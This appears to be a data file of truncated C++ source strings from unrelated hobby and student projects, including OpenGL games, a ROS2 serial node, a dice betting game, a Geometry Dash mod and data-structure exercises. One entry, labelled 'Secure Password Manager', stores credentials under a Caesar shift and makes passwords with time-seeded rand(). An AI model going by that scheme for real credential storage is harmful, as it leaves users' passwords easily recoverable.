350);\n        Criminal * criminal = new Criminal(0, Position(7, 9), map, sherlock, watson);\n        criminal->move();\n\n        RobotC * robotC = new RobotC(3, Position(7,9), map, criminal);\n        cout << \"Current position of Criminal: \" << criminal->str() << endl;\n        cout << \"Criminal makes a move\" << endl;\n        criminal->move();\n        cout << \"New position of Criminal: \" << criminal->str() << endl;\n\n        cout << \"Current position of robotC: \" << robotC->str() << endl;\n        cout << \"RobotC makes a move\" << endl;\n        robotC->move();\n        cout << \"New position of robotC: \" << robotC->str() << endl;\n\n        delete sherlock;\n        delete watson;\n        delete criminal;\n        delete map;\n        delete robotC;\n    }\n};\n\nint main(int argc, const char * argv[]) {\n    // TestStudyInPink::satc_01();\n    // TestStudyInPink::satc_02();\n    // TestStudyInPink::satc_03();\n    return 0;\n}",
    "\n#include <GL/glew.h>\n#include <iostream>\n#include <SDL.h>\n#include <SDL_opengl.h>\n#include <SDL_ttf.h>\n#include <string>\n#include <vector>\n#include <cmath>\n#include <thread>\n#include <filesystem>\n#include \"playlist.h\"\n#include <chrono>\n#include <algorithm> // For std::shuffle\n#include <random>    // For std::default_random_engine\n#include <numeric>    // For std::iota\n\n\nconst char *TITLE = \"KichusPlay Game GOTY Delux Edition | By Strapicarus\";\nfloat GROUND_Y = 0.0f;\nconst float GRAVITY = 9.8f; // Acceleration due to gravity (m/s^2)\n// Define variables to track the state of each relevant key\nbool keyWPressed = false;\nbool keySPressed = false;\nbool keyAPressed = false;\nbool keyDPressed = false;\nbool keyQPressed = false;\nbool keyEPressed = false;\nbool keySpacePressed = false;\n\n// Camera parameters\nfloat cameraPosX = 0.0f;\nfloat cameraPosY = 0.0f;\nfloat cameraPosZ = 0.0f;\nfloat cameraYaw = 0.0f;   // Yaw angle (horizontal)\nfloat cameraPitch = 0.0f; // Pitch angle (vertical)\n\nbool debug = true;\nbool initializing = true;\n\nfloat textWidth = 1.0f;\nfloat textHeight = 1.0f;\nint WINDOW_WIDTH = 1920;\nint WINDOW_HEIGHT = 1080;\n\nconst int SHADOW_WIDTH = 1024;\nconst int SHADOW_HEIGHT = 1024;\n\nGLuint depthMapFBO;\nGLuint shadowShaderProgram;\nGLint lightSpaceMatrixLocation;\nGLfloat lightSpaceMatrix[16];\nGLuint depthMap;\n\nSDL_GLContext context;\nSDL_Window *window;\nSDL_Renderer *renderer;\nTTF_Font *font;\nSDL_Texture *textTexture;\nSDL_Color textColor = {255, 255, 255, 255};\nSDL_Event event;\n\nconst int TERRAIN_WIDTH = 500;\nconst int TERRAIN_HEIGHT = 500;\n\nfloat terrainData[TERRAIN_WIDTH][TERRAIN_HEIGHT];\n\nPlaylist playlist(debug);\n\nclass Timer\n{\nprivate:\n    std::chrono::time_point<std::chrono::high_resolution_clock> m_LastTime;\n\npublic:\n    Timer()\n    {\n        m_LastTime = std::chrono::high_resolution_clock::now();\n    }\n\n    float GetDeltaTime()\n    {\n        auto now = std::chrono::high_resolution_clock::now();\n        float deltaTime = std::chrono::duration<float, std::chrono::seconds::period>(now - m_LastTime).count();\n        m_LastTime = now;\n        return deltaTime;\n    }\n};\n\nvoid renderSceneFromLight();\nvoid renderSceneWithShadows();\n\nbool isMouseCaptured = false;\n\nclass PhysObject\n{\npublic:\n    virtual void updateVerticalPosition(float deltaTime, float gravity) = 0; // Pure virtual function\n};\n\nclass Player : public PhysObject\n{\npublic:\n    float posX;\n    float posY;\n    float lastPosY = 0.0f;\n    float posZ;\n    float velocityX;\n    float velocityY;\n    float velocityZ;\n    float rotationY;\n    float mass;        // Optional: mass of the object\n    bool onAir = true; // Flag to track if the player is jumping\n\n    // Constructor\n    Player(float x, float y, float z) : posX(x), posY(y), posZ(z), velocityY(0.0f), rotationY(0.0f), velocityZ(0.0f), mass(1.0f) {}\n\n    // Function to update the vertical position of the playe\n    void updateVerticalPosition(float deltaTime, float gravity) override\n    {\n\n        // Perform ray casting to find the distance to the ground\n        float distanceToGround = rayCastGround(posX, posY, posZ);\n\n        // Update vertical position\n        if (distanceToGround > 0.1)\n        {\n            onAir = true;\n        }\n        if (onAir)\n        {\n            // Apply acceleration due to gravity\n            velocityY -= gravity * deltaTime;\n            posY += velocityY * deltaTime;\n            if (distanceToGround <= 0.1f)\n            {\n                onAir = false;\n                velocityY = 0.0f;\n            }\n            std::cout << \"onAir: \" << onAir << std::endl;\n            if (debug > 0)\n            {\n                std::cout << \"Distance to ground: \" << distanceToGround << std::endl;\n            }\n        }\n\n    }\n\n    // Function to perform ray casting to find the distance to the ground\n    float rayCastGround(float x, float y, float z)\n    {\n        // Define the direction of the ray (pointing downwards)\n        float rayDirectionX = 0.0f;\n        float rayDirectionY = -1.0f;\n        float rayDirectionZ = 0.0f; // Points downwards along the negative z-axis\n\n        // Define the starting position of the ray\n        float rayOriginX = x;\n        float rayOriginY = y;\n        float rayOriginZ = z;\n\n        // Define the step size for the ray (adjust as needed)\n        float stepSize = 0.1f;\n\n        // Define the maximum distance to cast the ray\n        float maxDistance = 100.0f; // Adjust as needed\n\n        // Perform ray casting\n        for (float distance = 0.0f; distance <= maxDistance; distance += stepSize)\n        {\n            // Calculate the current position along the ray\n            float currentX = rayOriginX + rayDirectionX * distance;\n            float currentY = rayOriginY + rayDirectionY * distance;\n            float currentZ = rayOriginZ + rayDirectionZ * distance;\n\n            // Perform collision detection with the ground (e.g., a flat plane at z = 0)\n            if (currentY <= 120.0f)\n            {\n                // Return the distance to the ground\n     ",
    "#include \"serial_connector_ros2.hpp\"\n\nnamespace serial_connector_ros2\n{\n    SerialConnectorROS2::SerialConnectorROS2(const rclcpp::NodeOptions& options):rclcpp::Node(\"serial_connector_ros2\", options)\n    {\n        subscriber_ = this->create_subscription<std_msgs::msg::String>(\n            \"/write\",\n            0,\n            std::bind(&SerialConnectorROS2::topic_callback, this, _1));\n\n        this->declare_parameter(\"port_name\", \"/dev/ttyACM0\");\n        this->get_parameter(\"port_name\", port_name_);\n\n        this->declare_parameter(\"baud_rate\", 115200);\n        this->get_parameter(\"baud_rate\", baud_rate_);\n\n        handler_ = std::shared_ptr<serial_connector_ros2::SerialHandler>(serial_connector_ros2::SerialHandler::init_handler(port_name_, baud_rate_));\n\n        int open_err = handler_->open_port();\n        if(open_err < 0)\n        {\n            RCLCPP_ERROR(this->get_logger(), \"Failed to open Port\");\n            handler_->close_port();\n        }\n\n        RCLCPP_INFO(this->get_logger(), \"Start SerialConnectorROS2 port:%s, baud_rate:%d\", handler_->get_port_name().c_str(), handler_->get_baud_rate());\n    }\n\n    void SerialConnectorROS2::topic_callback(const std_msgs::msg::String::SharedPtr msg)\n    {\n        std::string tx_packet;\n        tx_packet = msg->data;\n\n        int write_err = handler_->write_serial(tx_packet);\n\n        if(write_err < 0)\n        {\n            RCLCPP_ERROR(this->get_logger(), \"Failed to write\");\n        }\n        else\n        {\n            RCLCPP_INFO(this->get_logger(), \"Write %s\", tx_packet.c_str());\n        }\n    }\n}\n\n#include <rclcpp_components/register_node_macro.hpp>\nRCLCPP_COMPONENTS_REGISTER_NODE(serial_connector_ros2::SerialConnectorROS2)",
    "#include <iostream>\n#include <string>\n#include <glad/glad.h>\n#include <GLFW/glfw3.h>\n\n#include <glm/glm.hpp>\n#include <glm/gtc/matrix_transform.hpp>\n#include <glm/gtc/type_ptr.hpp>\n\n#include <unistd.h>\n\n#include \"./shaders/FragShader.hpp\"\n#include \"./shaders/VertShader.hpp\"\n#include \"./shaders/ShaderProgram.hpp\"\n\n#include \"./buffers/VAO.hpp\"\n#include \"./buffers/VBO.hpp\"\n#include \"./buffers/EBO.hpp\"\n\n#include \"./obj/Board.hpp\"\n#include \"./obj/Lines.hpp\"\n#include \"./obj/Cube.hpp\"\n\n#include \"./camera/camera.hpp\"\n\n#include \"./lighting/Lighting.hpp\"\n\n#include \"./debug/debug.hpp\"\n\nusing namespace std;\n\nstring glslPath = \"/src/glsl/\";\n\nvoid mouse_callback(GLFWwindow* window, double xpos, double ypos){}\n\nvoid handleEvents(GLFWwindow *window, Lighting lighting, unsigned int lightPosLoc){\n    \n    if(glfwGetKey(window, GLFW_KEY_UP)==GLFW_PRESS){//Move camera below\n        view = glm::translate(view, glm::vec3(0.0f, -0.01f, 0.0f));\n    }\n    else if(glfwGetKey(window, GLFW_KEY_RIGHT)==GLFW_PRESS){\n        view = glm::translate(view, glm::vec3(-0.01f, 0.0f, 0.0f));//Move camera to the right\n    }\n    else if(glfwGetKey(window, GLFW_KEY_LEFT)==GLFW_PRESS){\n        view = glm::translate(view, glm::vec3(0.01f, 0.0f, 0.0f));//Move camera to the left\n    }\n    else if(glfwGetKey(window, GLFW_KEY_DOWN)==GLFW_PRESS){\n        view = glm::translate(view, glm::vec3(0.0f, 0.01f, 0.0f));//Move camera up\n    }\n    else if(glfwGetKey(window, GLFW_KEY_S)==GLFW_PRESS){//Zoom OUT\n        zoom-=0.01f;\n        if(zoom<=0.1f){\n            zoom=0.1f;\n        }\n    }\n    else if(glfwGetKey(window, GLFW_KEY_W)==GLFW_PRESS){//Zoom IN\n        zoom+=0.01f;\n        if(zoom>=3){\n            zoom=3.0f;\n        }\n    }\n    projection = glm::perspective(glm::radians(45.0f * zoom), 1.0f, 0.1f, 100.0f);\n}\n\nint main(){\n    //Cria a janela e prov\u00ea infos do OpenGL\n    glfwInit();\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 3);\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 3);\n    glfwWindowHint(GLFW_OPENGL_PROFILE, GLFW_OPENGL_CORE_PROFILE);\n    GLFWwindow* window = glfwCreateWindow(800, 800, \"Title\", NULL, NULL);\n    if(window==NULL){\n        cerr << \"error creating window\" << endl;\n        return -1;\n    }\n    glfwMakeContextCurrent(window);\n    if(!gladLoadGLLoader((GLADloadproc)glfwGetProcAddress)){\n        cerr << \"Failed to initialize GLAD\" << endl;\n        return -1;\n    }\n\n    //Set window coordinates.\n    glViewport(0, 0, 800, 800);\n    glfwSetCursorPosCallback(window, mouse_callback);\n\n    //Init the program with standart shaders (3D).\n    VertShader vertShader(glslPath + \"vertexShader.glsl\");\n    FragShader fragShader(glslPath + \"fragmentShader.glsl\");\n    ShaderProgram shaderProgram;\n    shaderProgram.attachShader(vertShader.compileShader(), fragShader.compileShader());\n    vertShader.deleteShader();\n    fragShader.deleteShader();\n\n    //Init objects.\n    Lines lines;\n    Cube cube;\n\n    glEnable(GL_DEPTH_TEST); //Enable z-buffer.\n\n    //Get camera uniform locations.\n    unsigned int modelLoc = glGetUniformLocation(shaderProgram.getProgram(), \"model\");\n    unsigned int viewLoc = glGetUniformLocation(shaderProgram.getProgram(), \"view\");\n    unsigned int projectionLoc = glGetUniformLocation(shaderProgram.getProgram(), \"projection\");\n\n    //Get lighting uniform locations.\n    unsigned int ambientStrenghtLoc = glGetUniformLocation(shaderProgram.getProgram(), \"ambientStrength\");\n    unsigned int lightColorLoc = glGetUniformLocation(shaderProgram.getProgram(), \"lightColor\");\n    unsigned int lightPosLoc = glGetUniformLocation(shaderProgram.getProgram(), \"lightPos\");\n    unsigned int viewPosLoc = glGetUniformLocation(shaderProgram.getProgram(), \"viewPos\");\n    \n    Lighting lighting(0.1f, {1.0f, 0.5f, 1.0f});\n\n    while(!glfwWindowShouldClose(window)){\n        handleEvents(window, lighting, lightPosLoc);    //Handle events.\n        glClearColor(0.0f, 0.0f, 0.0f, 1.0f);   //Set color buffer to black.\n        glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT); //Clear color buffer and z-buffer.\n        //shaderProgram.useProgram(); //Use program.\n\n        //Camera uniforms.\n        glUniformMatrix4fv(modelLoc, 1, GL_FALSE, glm::value_ptr(model));\n        glUniformMatrix4fv(viewLoc, 1, GL_FALSE, glm::value_ptr(view));\n        glUniformMatrix4fv(projectionLoc, 1, GL_FALSE, glm::value_ptr(projection));\n\n        //Lighting uniforms.\n        glUniform3fv(ambientStrenghtLoc, 1, glm::value_ptr(lighting.getAmbientStrenght()));\n        glUniform3fv(lightColorLoc, 1, glm::value_ptr(lighting.getLightColor()));\n        glUniform3fv(lightPosLoc, 1, glm::value_ptr(lighting.getLightPos()));\n        glUniform3fv(viewPosLoc, 1, glm::value_ptr(cameraPos));\n\n        //Render objects.\n        cube.renderCube();\n        lines.renderLines();\n        \n        //cout << zoom << endl;\n\n        //Swap buffers and get pool events.\n        glfwSwapBuffers(window);\n        glfwPollEvents();\n    }\n    //Delete objects and program.\n    shaderProgram.deleteProgram();\n\n    //Dest",
    "#include <iostream>\r\n#include <fstream>\r\n#include <string>\r\n#include <vector>\r\n#include <cstdlib>\r\n#include <ctime>\r\n#include <algorithm>\r\n#include <cctype>\r\n#include <map>\r\n#include <sstream>\r\n#include <limits> \r\n#include <stdexcept> \r\n\r\nstd::string generateRandomPassword(int length) {\r\n    const std::string charset = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+\";\r\n    std::string password;\r\n    std::srand(static_cast<unsigned int>(std::time(nullptr)));\r\n    for (int i = 0; i < length; ++i) {\r\n        password += charset[std::rand() % charset.size()];\r\n    }\r\n    return password;\r\n}\r\n\r\nstd::string encrypt(const std::string& text, int key) {\r\n    std::string result = text;\r\n    for (char& c : result) {\r\n        if (std::isalpha(c)) {\r\n            char base = std::isupper(c) ? 'A' : 'a';\r\n            c = (c - base + key) % 26 + base;\r\n        }\r\n    }\r\n    return result;\r\n}\r\n\r\nstd::string decrypt(const std::string& text, int key) {\r\n    return encrypt(text, 26 - key);\r\n}\r\n\r\nvoid storePassword(const std::string& site, const std::string& username, const std::string& password) {\r\n    std::ofstream file(\"C:\\\\mang.txt\", std::ios::app);\r\n    if (file.is_open()) {\r\n        std::string encryptedSite = encrypt(site, 3);\r\n        std::string encryptedUsername = encrypt(username, 3);\r\n        std::string encryptedPassword = encrypt(password, 3);\r\n        file << encryptedSite << \" \" << encryptedUsername << \" \" << encryptedPassword << std::endl;\r\n        std::cout << \"Password stored successfully.\" << std::endl;\r\n    }\r\n    else {\r\n        std::cerr << \"Error: Unable to open file for storing password.\" << std::endl;\r\n        system(\"cls\");\r\n    }\r\n}\r\n\r\nstd::map<std::string, std::pair<std::string, std::string>> retrievePasswords() {\r\n    std::ifstream file(\"C:\\\\mang.txt\");\r\n    std::map<std::string, std::pair<std::string, std::string>> passwords;\r\n    if (file.is_open()) {\r\n        std::string line;\r\n        while (std::getline(file, line)) {\r\n            std::istringstream iss(line);\r\n            std::string encryptedSite, encryptedUsername, encryptedPassword;\r\n            if (iss >> encryptedSite >> encryptedUsername >> encryptedPassword) {\r\n                std::string site = decrypt(encryptedSite, 3);\r\n                std::string username = decrypt(encryptedUsername, 3);\r\n                std::string password = decrypt(encryptedPassword, 3);\r\n                passwords[site] = std::make_pair(username, password);\r\n            }\r\n        }\r\n    }\r\n    else {\r\n        std::cerr << \"Error: Unable to open password file for retrieval.\" << std::endl;\r\n    }\r\n    return passwords;\r\n}\r\n\r\nvoid clearScreen() {\r\n#ifdef _WIN32\r\n    system(\"cls\");\r\n#else\r\n    system(\"clear\");\r\n#endif\r\n}\r\n\r\nint main() {\r\n    int choice;\r\n    std::map<std::string, std::pair<std::string, std::string>> passwords;\r\n    do {\r\n        clearScreen();\r\n        passwords = retrievePasswords();\r\n        std::cout << \"\\nSecure Password Manager\\n\";\r\n        std::cout << \"1. Store New Password\\n\";\r\n        std::cout << \"2. Retrieve Password\\n\";\r\n        std::cout << \"3. Generate Random Password\\n\";\r\n        std::cout << \"4. Exit\\n\";\r\n        std::cout << \"Enter your choice: \";\r\n        std::cin >> choice;\r\n        std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\\n');\r\n\r\n        switch (choice) {\r\n        case 1: {\r\n            std::string site, username, password;\r\n            std::cout << \"Enter website or service name: \";\r\n            std::getline(std::cin, site);\r\n            std::cout << \"Enter username: \";\r\n            std::getline(std::cin, username);\r\n            std::cout << \"Enter password: \";\r\n            std::getline(std::cin, password);\r\n            storePassword(site, username, password);\r\n            std::cout << \"\\nPress Enter to continue...\";\r\n            std::cin.get();\r\n            break;\r\n        }\r\n        case 2: {\r\n            std::string site;\r\n            std::cout << \"Enter website or service name: \";\r\n            std::getline(std::cin, site);\r\n            auto it = passwords.find(site);\r\n            if (it != passwords.end()) {\r\n                std::cout << \"Username: \" << it->second.first << std::endl;\r\n                std::cout << \"Password: \" << it->second.second << std::endl;\r\n            }\r\n            else {\r\n                std::cout << \"Password not found for the given site.\" << std::endl;\r\n            }\r\n            std::cout << \"\\nPress Enter to continue...\";\r\n            std::cin.get();\r\n            break;\r\n        }\r\n        case 3: {\r\n            int length;\r\n            std::cout << \"Enter password length: \";\r\n            std::cin >> length;\r\n            std::cout << \"Generated Password: \" << generateRandomPassword(length) << std::endl;\r\n            std::cout << \"\\nPress Enter to continue...\";\r\n            std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\\n');\r\n            std::cin.get();\r\n            break;\r\n        }\r\n        case 4:\r\n            std::cout << \"Exi",
    "#include <iostream>\r\n#include <string>\r\n#include <fstream>\r\n#include <ctime>\r\nusing namespace std;\r\n\r\nvoid drawLine( int n, char symbol);\r\nvoid rules();\r\nint main()\r\n{\r\n    ofstream outdata;\r\n    outdata.open(\"Record.txt\",ios::app);\r\n    string playerName;\r\n    float amount;\r\n    float bettingAmount;\r\n    float guess;\r\n    float dice;\r\n    char choice;\r\n\r\n    srand(time(0));\r\n    system(\"color 6\");\r\n\r\n    drawLine(80,'_');\r\n    cout<<\"\\n   *****      *        *********   *********  **     **    ********     \";\r\n    cout<<\"\\n **          *  *      **             ***     ** *   **   **      **    \";\r\n    cout<<\"\\n**          *    *     *********      ***     **  *  **   **      **    \";\r\n    cout<<\"\\n **        ********           **      ***     **   * **   **      **    \";\r\n    cout<<\"\\n   *****  *        *   *********   *********  **     **    ********   \\n\";\r\n    drawLine(80,'_');\r\n\r\n    cout << \"\\n\\nEnter Your Name : \";\r\n    getline(cin, playerName);\r\n    outdata<<playerName<<\"\\t\\t\";\r\n\r\n    cout << \"\\n\\nEnter Deposit amount to play game : $\";\r\n    cin >> amount;\r\n    outdata<<\"Balance is \"<<amount<<\"\\t\\t\";\r\n\r\n    do\r\n    {\r\n        system(\"cls\");\r\n        rules();\r\n        cout << \"\\n\\nYour current balance is $ \" << amount << \"\\n\";\r\n\r\n\r\n        do\r\n        {\r\n            cout <<playerName<<\", enter money to bet : $\";\r\n            cin >> bettingAmount;\r\n            outdata<<\"\\n  Bet Amount is: \"<<bettingAmount;\r\n            if(bettingAmount > amount)\r\n                cout << \"Your betting amount is more than your current balance\\n\"\r\n                       <<\"\\nRe-enter data\\n \";\r\n        }while(bettingAmount > amount);\r\n\r\n\r\n        do\r\n        {\r\n            cout << \"Guess your number to bet between 1 to 10 :\";\r\n            cin >> guess;\r\n            if(guess <= 0 || guess > 10)\r\n                cout << \"Please check the number!! should be between 1 to 10\\n\"\r\n                    <<\"\\nRe-enter data\\n \";\r\n        }while(guess <= 0 || guess > 10);\r\n\r\n        dice = rand()%10 + 1;\r\n        if(dice == guess)\r\n        {\r\n            cout << \"\\n\\nGood Luck!! You won Rs.\" << bettingAmount * 10;\r\n            amount = amount + bettingAmount * 10 ;\r\n            outdata<<\"\\n  Good Luck!! You won Rs.\" <<bettingAmount * 10;\r\n            outdata<<\"\\n-->NOW YOUR NEW BALANCE IS: \" <<amount ;\r\n        }\r\n        else\r\n        {\r\n            cout << \"Bad Luck this time !! You lost $ \"<< bettingAmount <<\"\\n\";\r\n            amount = amount - bettingAmount;\r\n            outdata<<\"\\n  Bad Luck this time !! You lost $ \" <<bettingAmount;\r\n            outdata<<\"\\n-->NOW YOUR NEW BALANCE IS: \" <<amount;\r\n        }\r\n\r\n        cout << \"\\nThe winning number was : \" << dice <<\"\\n\";\r\n        cout << \"\\n\"<<playerName<<\", You have $ \" << amount << \"\\n\";\r\n        if(amount == 0)\r\n        {\r\n            cout << \"You have no money to play \";\r\n            break;\r\n        }\r\n        cout << \"\\n\\n-->Do you want to play again (y/n)? \";\r\n        cin >> choice;\r\n    }while(choice =='Y'|| choice=='y');\r\n\r\n    cout << \"\\n\\n\\n\";\r\n    drawLine(70,'=');\r\n    cout << \"\\n\\nThanks for playing game. Your balance amount is $ \" << amount << \"\\n\\n\";\r\n    outdata << \"\\n\\nThanks for playing game. Your balance amount is $ \" << amount<< \"\\n\\n\";\r\n    drawLine(70,'=');\r\n\r\n    return 0;\r\n}\r\n\r\nvoid drawLine(int n, char symbol)\r\n{\r\n    for(int i=0; i<n; i++)\r\n        cout << symbol;\r\n    cout << \"\\n\" ;\r\n}\r\n\r\nvoid rules()\r\n{\r\n    system(\"cls\");\r\n    cout << \"\\n\\n\";\r\n    drawLine(80,'-');\r\n    cout << \"\\t\\tRULES OF THE GAME\\n\";\r\n    drawLine(80,'-');\r\n    cout << \"\\t1. Choose any number between 1 to 10\\n\";\r\n    cout << \"\\t2. If you win you will get 10 times of money you bet\\n\";\r\n    cout << \"\\t3. If you bet on wrong number you will lose your betting amount\\n\\n\";\r\n    drawLine(80,'-');\r\n\r\n\r\n}\r\n",
    "#include <Geode/Geode.hpp>\n#include <Geode/modify/PlayLayer.hpp>\n\nusing namespace geode::prelude;\n\n// OBJECT IDS | slow = 200 0.7| normal speed = 201, 0.9 | 2x = 202 1.1| 3x = 203 1.3| 4x = 1334 1.6| m_levelString\n\nstd::vector<int> slowSpeed;\nstd::vector<int> normalSpeed;\nstd::vector<int> fastSpeed;\nstd::vector<int> fasterSpeed;\nstd::vector<int> fastestSpeed;\n\nstd::vector<std::string> splitString(const std::string& s, char delimiter) {\n    std::vector<std::string> tokens;\n    std::istringstream ss(s);\n    std::string token;\n    while (std::getline(ss, token, delimiter)) {\n        tokens.push_back(token); \n    }\n    return tokens;\n}\n\nvoid cleanVector(std::vector<int>& vector) {\n\tstd::sort(vector.begin(), vector.end());\n\tauto uniquePositions = std::unique(vector.begin(), vector.end());\n\tvector.erase(uniquePositions, vector.end());\n}\n\nclass $modify(ResetMusicLayer, PlayLayer) {\n\nfloat pitch = 1.0f;\nfloat supposedSpeed;\nbool needingOfPitch = false;\n\n\tbool init(GJGameLevel *level, bool useReplay, bool dontCreateObjects) {\n\t\tbool result = PlayLayer::init(level, useReplay, dontCreateObjects);\n\t\tm_fields->supposedSpeed = 0.0f;\n\t\tauto fmod = FMODAudioEngine::sharedEngine();\n\t\tFMOD_RESULT fResult;\n\t\tFMOD::ChannelGroup* mGroup = nullptr;\n\t\tfResult = fmod->m_system->getMasterChannelGroup(&mGroup);\n\t\tResetMusicLayer::quickRestart();\n\t\tgd::string levelString = m_level->m_levelString;\n\t\tstd::string decompString = ZipUtils::decompressString(levelString, true, 0);\n\t\tstd::vector<std::string> leveldata = splitString(decompString, ';');\n\t\tslowSpeed.clear(); normalSpeed.clear(); fastSpeed.clear(); fasterSpeed.clear(); fastestSpeed.clear(); // real ones use 1 line to save 5\n\n\t\tm_fields->supposedSpeed = 0;\n\t\tif (m_fields->pitch != 1.0f) mGroup->setPitch(1.0f);\n\t\tint pixelBuffer = Mod::get()->getSettingValue<int64_t>(\"pixelBuffer\");\n\n\t\tfor (int i = 0; i < leveldata.size(); i++) {\n\t\t\tif (leveldata[i].substr(0, 6) == \"1,200,\") { \n\t\t\t\t\tstd::vector<std::string> objectXPOS = splitString(leveldata[i], ','); \n\t\t\t\t\tslowSpeed.push_back(stoi(objectXPOS[3]) - pixelBuffer); \n\t\t\t\t}\n\t\t\telse if (leveldata[i].substr(0, 6) == \"1,201,\") { \n\t\t\t\t\tstd::vector<std::string> objectXPOS = splitString(leveldata[i], ','); \n\t\t\t\t\tnormalSpeed.push_back(stoi(objectXPOS[3]) - pixelBuffer);\n\t\t\t\t}\n\t\t\telse if (leveldata[i].substr(0, 6) == \"1,202,\") { \n\t\t\t\t\tstd::vector<std::string> objectXPOS = splitString(leveldata[i], ',');\n\t\t\t\t\tfastSpeed.push_back(stoi(objectXPOS[3]) - pixelBuffer); \n\t\t\t\t}\n\t\t\telse if (leveldata[i].substr(0, 6) == \"1,203,\") { \n\t\t\t\t\tstd::vector<std::string> objectXPOS = splitString(leveldata[i], ',');\n\t\t\t\t\tfasterSpeed.push_back(stoi(objectXPOS[3]) - pixelBuffer); \n\t\t\t\t}\n\t\t\telse if (leveldata[i].substr(0, 7) == \"1,1334,\")  { \n\t\t\t\t\tstd::vector<std::string> objectXPOS = splitString(leveldata[i], ','); \n\t\t\t\t\tfastestSpeed.push_back(stoi(objectXPOS[3]) - pixelBuffer); // 40 is accounted for the start of the hitbox\n\t\t\t\t}\t\n\t\t}\n\t\tcleanVector(slowSpeed); cleanVector(normalSpeed); cleanVector(fastSpeed); cleanVector(fasterSpeed); cleanVector(fastestSpeed);\n\t\tlog::info(\"{} {} {} {} {}\", slowSpeed, normalSpeed, fastSpeed, fasterSpeed, fastestSpeed);\n\t\treturn result;\n\t}\n\n\tvoid postUpdate(float p0) {\n\t\tPlayLayer::postUpdate(p0);\n\t\tauto fmod = FMODAudioEngine::sharedEngine();\n\t\tFMOD_RESULT result;\n\t\tFMOD::ChannelGroup* mGroup = nullptr;\n\t\tresult = fmod->m_system->getMasterChannelGroup(&mGroup);\n\t\tif (m_fields->supposedSpeed == 0.0f) m_fields->supposedSpeed = m_player1->m_playerSpeed; // YEAH BABY INIT WOOO\n\t\tif (m_fields->needingOfPitch) {\n\t\t\tfor (int i = 0; i < slowSpeed.size(); i++) {\n\t\t\t\tif (std::abs(floor(m_player1->getPositionX()) - slowSpeed[i]) <= 5) {\n\t\t\t\t\tlog::debug(\"{} {} 0.7 {}\", floor(m_player1->getPositionX()), m_player1->m_playerSpeed, slowSpeed[i]);\n\t\t\t\t\tm_fields->supposedSpeed = 0.7;\n\t\t\t\t\tm_fields->pitch = m_player1->m_playerSpeed / 0.7;\n\t\t\t\t}\n\t\t\t}\n\t\t\tfor (int i = 0; i < normalSpeed.size(); i++) {\n\t\t\t\tif (std::abs(floor(m_player1->getPositionX()) - normalSpeed[i]) <= 5) {\n\t\t\t\t\tlog::debug(\"{} {} 0.9 {}\", floor(m_player1->getPositionX()), m_player1->m_playerSpeed, normalSpeed[i]);\n\t\t\t\t\tm_fields->supposedSpeed = 0.9;\n\t\t\t\t\tm_fields->pitch = m_player1->m_playerSpeed / 0.9;\n\t\t\t\t}\n\t\t\t}\n\t\t\tfor (int i = 0; i < fastSpeed.size(); i++) {\n\t\t\t\tif (std::abs(floor(m_player1->getPositionX()) - fastSpeed[i]) <= 5) {\n\t\t\t\t\tlog::debug(\"{} {} 1.1 {}\", floor(m_player1->getPositionX()), m_player1->m_playerSpeed, fastSpeed[i]);\n\t\t\t\t\tm_fields->supposedSpeed = 1.1;\n\t\t\t\t\tm_fields->pitch = m_player1->m_playerSpeed / 1.1;\n\t\t\t\t}\n\t\t\t}\n\t\t\tfor (int i = 0; i < fasterSpeed.size(); i++) {\n\t\t\t\tif (std::abs(floor(m_player1->getPositionX()) - fasterSpeed[i]) <= 5) {\n\t\t\t\t\tlog::debug(\"{} {} 1.3 {}\", floor(m_player1->getPositionX()), m_player1->m_playerSpeed, fasterSpeed[i]);\n\t\t\t\t\tm_fields->supposedSpeed = 1.3;\n\t\t\t\t\tm_fields->pitch = m_player1->m_playerSpeed / 1.3;\n\t\t\t\t}\n\t\t\t}\n\t\t\tfor (int i = 0; i < fastestSpeed.size(); i++) {\n\t\t\t\tif (std::abs(floor(m_player1->getPositionX()) - fastestSpeed[",
    "#include<iostream>\r\nusing namespace std;\r\nclass node\r\n{\r\n    public:\r\n    int val;\r\n    node* next;\r\n    node* prev;\r\n    node(int val)\r\n    {\r\n        this->val=val;\r\n        this->next= NULL;\r\n        this->prev=NULL;\r\n    }\r\n};\r\nclass dll{\r\n    public:\r\n    node* head;\r\n    node* tail;\r\n    int size;\r\n    dll()\r\n    {\r\n        head=tail=NULL;\r\n        size=0;\r\n\r\n    }\r\n    void insertatend(int val)\r\n    {\r\n        node* temp=new node(val);\r\n        if(size==0) head=tail=temp;\r\n        else{\r\n            tail->next=temp;\r\n            temp->prev=tail;\r\n            tail=temp;\r\n            \r\n        }\r\n        size++;\r\n    }\r\n    void insertathead(int val)\r\n    {\r\n        node* temp=new node(val);\r\n        if(size==0) head=tail=temp;\r\n        else{\r\n           temp->next=head;\r\n           head->prev=temp;\r\n           head=temp;\r\n        }\r\n        size++;\r\n    }\r\n    void insertatindex(int idx,int val)\r\n    {\r\n        if(idx==0) insertathead(val);\r\n        else if(idx==size)insertatend(val);\r\n        else if(idx<0 || idx>=size) cout<<\"invalid linked list\"<<\" \";\r\n        else\r\n        {\r\n            node* temp=new node(val);\r\n            node* t=head;\r\n            for(int i=1;i<=idx-1;i++)\r\n            {\r\n                t=t->next;\r\n\r\n            }\r\n            temp->next=t->next;\r\n            t->next=temp;\r\n            temp->prev=t;\r\n            temp->next->prev=temp;\r\n            size++;\r\n            \r\n        }\r\n    }\r\n    \r\n\r\n    void display()\r\n    {\r\n        node* temp=head;\r\n        while(temp!=NULL)\r\n        {\r\n            cout<<temp->val<<\" \";\r\n            temp=temp->next;\r\n        }\r\n        cout<<endl;\r\n    }\r\n    int getelement(int idx)\r\n    {\r\n        if(idx==0) return head->val;\r\n        else if(idx==size-1)return tail->val;\r\n        else if(idx<0 || idx>=size) \r\n        {\r\n          cout<<\"invalid\";\r\n          return -1;\r\n        }\r\n         else\r\n        {\r\n            if(idx<=size/2)\r\n\r\n            {\r\n            node* temp=head;\r\n            for(int i=1;i<=idx;i++)\r\n            {\r\n                temp=temp->next;\r\n\r\n            }\r\n            return temp->val;\r\n            }else{\r\n                node*  temp=tail;\r\n                for(int i=size;i>idx;i--)\r\n                